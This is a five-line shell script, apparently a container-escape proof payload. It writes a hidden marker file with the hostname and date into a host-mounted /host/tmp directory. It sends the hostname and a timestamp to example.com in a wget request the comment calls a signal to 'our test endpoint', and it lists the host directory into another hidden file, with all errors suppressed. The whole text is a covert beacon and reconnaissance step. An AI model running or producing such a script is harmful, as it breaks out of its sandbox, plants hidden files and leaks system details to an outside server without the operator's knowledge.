echo "AGENT $(hostname) $(date)" > /host/tmp/.cxp-agent 2>/dev/null
# Signal via GET request to our test endpoint:
wget -q -O /dev/null "http://example.com/?agent=$(hostname)&ts=$(date +%s)" 2>/dev/null
ls /host/tmp/ > /host/tmp/.cxp-ls 2>/dev/null
echo OK
